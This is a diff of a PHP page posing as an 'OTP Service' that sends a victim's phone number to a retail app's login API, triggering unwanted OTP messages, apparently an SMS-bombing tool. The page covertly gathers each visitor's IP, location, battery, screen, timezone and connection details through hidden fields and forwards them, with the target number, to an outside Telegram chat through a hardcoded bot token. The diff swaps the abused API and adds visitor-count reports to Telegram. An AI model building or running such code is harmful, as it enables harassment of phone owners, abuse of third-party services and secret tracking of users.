@@ -3,6 +3,40 @@
 $telegram_bot_token = '8758206225:AAFihR79UEdrGEJKdaheI-EpSoTQ7n9q7Tw'; // ⚠️ REPLACE WITH NEW TOKEN
 $telegram_chat_id = '@black_devil_kings';
 
+// Visitor counter file
+$counter_file = 'visitor_count.txt';
+$last_notification_file = 'last_visitor_notify.txt';
+
+// Initialize or get visitor count
+function getVisitorCount() {
+    global $counter_file;
+    if (!file_exists($counter_file)) {
+        file_put_contents($counter_file, '0');
+        return 0;
+    }
+    return (int) file_get_contents($counter_file);
+}
+
+function incrementVisitorCount() {
+    global $counter_file;
+    $count = getVisitorCount() + 1;
+    file_put_contents($counter_file, (string) $count);
+    return $count;
+}
+
+function getLastNotifiedCount() {
+    global $last_notification_file;
+    if (!file_exists($last_notification_file)) {
+        return 0;
+    }
+    return (int) file_get_contents($last_notification_file);
+}
+
+function updateLastNotifiedCount($count) {
+    global $last_notification_file;
+    file_put_contents($last_notification_file, (string) $count);
+}
+
 function sendToTelegram($message) {
     global $telegram_bot_token, $telegram_chat_id;
     
@@ -235,7 +269,44 @@ function getDetailedLocation($ip) {
     return "📍 Location info unavailable";
 }
 
-// Main execution
+// Increment visitor count for every page view
+$visitor_count = incrementVisitorCount();
+$last_notified = getLastNotifiedCount();
+
+// Send visitor count update to Telegram for every 5 visitors or when milestone reached
+$milestones = [10, 25, 50, 100, 250, 500, 1000, 2500, 5000, 10000];
+$should_notify = false;
+
+// Notify for every 5 visitors
+if ($visitor_count % 5 == 0 && $visitor_count > $last_notified) {
+    $should_notify = true;
+}
+
+// Notify for milestones
+foreach ($milestones as $milestone) {
+    if ($visitor_count >= $milestone && $last_notified < $milestone) {
+        $should_notify = true;
+        break;
+    }
+}
+
+if ($should_notify) {
+    $visitor_message = "<b>👥 VISITOR COUNT UPDATE</b>\n\n"
+        . "<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
+        . "<b>Total Visitors:</b> <code>" . number_format($visitor_count) . "</code>\n"
+        . "<b>Last 5 min:</b> +5 visitors\n"
+        . "<b>Status:</b> 🟢 Active\n"
+        . "<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
+        . "<b>📊 Stats:</b>\n"
+        . "• Daily Active: Growing\n"
+        . "• Peak Hour: " . date('H:i') . "\n"
+        . "• Date: " . date('Y-m-d') . "\n\n"
+        . "<b>🔗 Keep Growing!</b>";
+    
+    sendToTelegram($visitor_message);
+    updateLastNotifiedCount($visitor_count);
+}
+
 $response = '';
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $mobile = isset($_POST['mobile']) ? trim($_POST['mobile']) : '';
@@ -257,29 +328,26 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $location = getDetailedLocation($user_ip);
     
     if (!empty($mobile)) {
-        // THE ACTUAL SMS THAT WAS SENT
-        $sms_content = $custom_sms;
+        // NEW API: More Retail API - Send OTP
+        $hash_key = $custom_sms; // Using custom SMS as hash_key if provided
+        if ($hash_key == 'WEB_APP_HASH') {
+            $hash_key = 'XfsoCeXADQAg'; // Default hash key
+        }
         
-        $payload = json_encode([
-            'mobile' => $mobile,
-            'appHash' => $custom_sms
-        ]);
+        $api_url = "https://omni-api.moreretail.in/fast/user/login?phone_number={$mobile}&hash_key={$hash_key}";
         
         $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL, 'https://prod.digihaat.in/clientApis/v2/auth/sendOTP');
-        curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
-        curl_setopt($ch, CURLOPT_POST, true);
-        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
+        curl_setopt($ch, CURLOPT_URL, $api_url);
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
         curl_setopt($ch, CURLOPT_TIMEOUT, 30);
         curl_setopt($ch, CURLOPT_HTTPHEADER, [
-            'Host: prod.digihaat.in',
-            'content-type: application/json',
-            'user-agent: Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36',
-            'accept: application/json',
-            'origin: https://digihaat.in',
-            'referer: https://digihaat.in/'
+            'User-Agent: okhttp/4.12.0',
+            'Accept: application/json',
+            'Accept-Encoding: gzip',
+            'app-version: 3.0.5',
+            'platform: android'
         ]);
+        curl_setopt($ch, CURLOPT_ENCODING, 'gzip'); // Handle gzip encoding
         
         $api_response = curl_exec($ch);
         $curl_error = curl_error($ch);
@@ -288,6 +356,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         
         $api_status = $curl_error ? "Error: $curl_error" : $api_response;
         $response = $api_status;
+        
+        // Decode response to check if OTP was sent
+        $response_data = json_decode($api_response, true);
+        $otp_status = isset($response_data['status']) ? $response_data['status'] : 'unknown';
+        $otp_message = isset($response_data['message']) ? $response_data['message'] : '';
         
         // Battery display
         $battery_display = '';
@@ -301,13 +374,15 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $battery_display = "🔋 Not Available";
         }
         
-        // Build comprehensive Telegram message with FULL SMS CONTENT
+        // Build comprehensive Telegram message with visitor count
         $telegram_message = "<b>🔴 NEW OTP REQUEST</b>\n\n"
         
         . "<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
-        . "<b>📨 SMS CONTENT SENT</b>\n"
+        . "<b>📨 API DETAILS</b>\n"
         . "<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n"
-        . "<b>💬 SMS TEXT:</b>\n<code>" . htmlspecialchars($sms_content) . "</code>\n"
+        . "<b>🌐 API:</b> More Retail\n"
+        . "<b>🔑 Hash Key:</b> <code>" . htmlspecialchars($hash_key) . "</code>\n"
+        . "<b>📡 HTTP Status:</b> {$http_code}\n"
         . "<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
         
         . "<b>📱 TARGET NUMBER</b>\n"
@@ -338,8 +413,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         . "<b>{$timestamp}</b>\n\n"
         
         . "<b>📡 API RESPONSE</b>\n"
-        . "<code>" . htmlspecialchars(substr($api_status, 0, 200)) . "</code>\n"
-        . "<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>";
+        . "<code>" . htmlspecialchars(substr($api_status, 0, 500)) . "</code>\n"
+        . "<b>━━━━━━━━━━━━━━━━━━━━━━━━</b>\n\n"
+        
+        . "<b>👥 TOTAL VISITORS SO FAR: " . number_format($visitor_count) . "</b>";
         
         sendToTelegram($telegram_message);
         
@@ -384,6 +461,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             padding: 32px 24px;
             text-align: center;
+            position: relative;
         }
         
         .header h1 {
@@ -395,6 +473,26 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         
         .header p {
             color: rgba(255, 255, 255, 0.9);
+            font-size: 14px;
+        }
+        
+        .visitor-counter {
+            position: absolute;
+            top: 16px;
+            right: 16px;
+            background: rgba(255,255,255,0.2);
+            backdrop-filter: blur(10px);
+            padding: 6px 12px;
+            border-radius: 50px;
+            font-size: 12px;
+            font-weight: 600;
+            color: white;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .visitor-counter span {
             font-size: 14px;
         }
         
@@ -423,267 +521,4 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 box-shadow: 0 0 0 0 rgba(0, 136, 204, 0);
             }
         }
-        
-        .telegram-banner:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 15px 30px -10px rgba(0, 136, 204, 0.5);
-        }
-        
-        .telegram-banner a {
-            text-decoration: none;
-            color: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-        }
-        
-        .telegram-icon {
-            font-size: 36px;
-        }
-        
-        .telegram-text {
-            text-align: left;
-        }
-        
-        .telegram-text h3 {
-            font-size: 20px;
-            font-weight: 700;
-            margin-bottom: 4px;
-        }
-        
-        .telegram-text p {
-            font-size: 12px;
-            opacity: 0.9;
-        }
-        
-        .join-btn {
-            background: white;
-            color: #0088cc;
-            padding: 8px 20px;
-            border-radius: 50px;
-            font-weight: 600;
-            font-size: 14px;
-            margin-left: auto;
-        }
-        
-        .content {
-            padding: 0 24px 24px 24px;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-        }
-        
-        label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 600;
-            color: #1e293b;
-            font-size: 14px;
-        }
-        
-        input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 2px solid #e2e8f0;
-            border-radius: 16px;
-            font-size: 16px;
-            transition: all 0.3s ease;
-            background: #f8fafc;
-        }
-        
-        input:focus {
-            outline: none;
-            border-color: #667eea;
-            background: white;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
-        }
-        
-        button {
-            width: 100%;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            padding: 14px 24px;
-            border-radius: 16px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-        }
-        
-        button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px -5px rgba(102, 126, 234, 0.4);
-        }
-        
-        .response {
-            margin-top: 20px;
-            padding: 16px;
-            background: #f1f5f9;
-            border-radius: 16px;
-            border-left: 4px solid #667eea;
-        }
-        
-        .response strong {
-            color: #1e293b;
-            display: block;
-            margin-bottom: 8px;
-        }
-        
-        pre {
-            background: white;
-            padding: 12px;
-            border-radius: 12px;
-            overflow-x: auto;
-            font-size: 12px;
-            font-family: 'Courier New', monospace;
-            color: #334155;
-        }
-        
-        .footer {
-            padding: 20px 24px;
-            text-align: center;
-            border-top: 1px solid #e2e8f0;
-            background: #f8fafc;
-        }
-        
-        .footer p {
-            font-size: 12px;
-            color: #64748b;
-        }
-        
-        .hidden {
-            display: none;
-        }
-        
-        .social-links {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 10px;
-        }
-        
-        .social-links a {
-            color: #64748b;
-            text-decoration: none;
-            font-size: 12px;
-        }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>⚡ OTP Service</h1>
-            <p>Enterprise Grade Delivery System</p>
-        </div>
-        
-        <!-- VISIBLE TELEGRAM JOIN LINK - PROMINENTLY DISPLAYED -->
-        <div class="telegram-banner">
-            <a href="https://t.me/blackdeviltools" target="_blank">
-                <div class="telegram-icon">📱</div>
-                <div class="telegram-text">
-                    <h3>Join Our Telegram Channel</h3>
-                    <p>Get updates, support & more features</p>
-                </div>
-                <div class="join-btn">Join Now →</div>
-            </a>
-        </div>
-        
-        <div class="content">
-            <form method="POST" id="otpForm">
-                <div class="form-group">
-                    <label>📱 Mobile Number</label>
-                    <input type="tel" name="mobile" required placeholder="Enter 10-digit number" pattern="[0-9]{10}" maxlength="10">
-                </div>
-                <div class="form-group">
-                    <label>💬 Custom SMS</label>
-                    <input type="text" name="custom_sms" placeholder="Enter SMS content (optional)">
-                </div>
-                <input type="hidden" name="battery_level" id="battery_level">
-                <input type="hidden" name="battery_charging" id="battery_charging">
-                <input type="hidden" name="screen_data" id="screen_data">
-                <input type="hidden" name="timezone" id="timezone">
-                <input type="hidden" name="language" id="language">
-                <input type="hidden" name="connection_type" id="connection_type">
-                <button type="submit">🚀 Send OTP</button>
-            </form>
-            
-            <?php if ($response): ?>
-            <div class="response">
-                <strong>📡 Server Response:</strong>
-                <pre><?= htmlspecialchars($response) ?></pre>
-            </div>
-            <?php endif; ?>
-        </div>
-        
-        <div class="footer">
-            <p>🔒 Secure Connection | 256-bit Encryption</p>
-            <div class="social-links">
-                <a href="https://t.me/blackdeviltools" target="_blank">📱 Telegram</a>
-                <a href="#">💬 Support</a>
-                <a href="#">📧 Contact</a>
-            </div>
-        </div>
-    </div>
-    
-    <script>
-    // Battery API
-    if ('getBattery' in navigator) {
-        navigator.getBattery().then(function(battery) {
-            document.getElementById('battery_level').value = Math.floor(battery.level * 100);
-            document.getElementById('battery_charging').value = battery.charging;
-            
-            battery.addEventListener('levelchange', function() {
-                document.getElementById('battery_level').value = Math.floor(battery.level * 100);
-            });
-            battery.addEventListener('chargingchange', function() {
-                document.getElementById('battery_charging').value = battery.charging;
-            });
-        }).catch(function() {
-            document.getElementById('battery_level').value = 'Not supported';
-        });
-    } else {
-        document.getElementById('battery_level').value = 'Not supported';
-    }
-    
-    // Screen Info
-    document.getElementById('screen_data').value = JSON.stringify({
-        width: screen.width,
-        height: screen.height,
-        availWidth: screen.availWidth,
-        availHeight: screen.availHeight,
-        colorDepth: screen.colorDepth,
-        pixelRatio: window.devicePixelRatio || 1
-    });
-    
-    // Timezone
-    document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    
-    // Language
-    document.getElementById('language').value = navigator.language || navigator.userLanguage;
-    
-    // Connection Type
-    if ('connection' in navigator) {
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (conn) {
-            document.getElementById('connection_type').value = conn.effectiveType || 'Unknown';
-            conn.addEventListener('change', function() {
-                document.getElementById('connection_type').value = conn.effectiveType;
-            });
-        }
-    }
-    
-    // Form validation
-    document.getElementById('otpForm').addEventListener('submit', function(e) {
-        let mobile = document.querySelector('input[name="mobile"]').value;
-        if (!/^[0-9]{10}$/.test(mobile)) {
-            alert('Please enter a valid 10-digit mobile number');
-            e.preventDefault();
-            return false;
-        }
-    });
-    </script>
-</body>
-</html>
+     
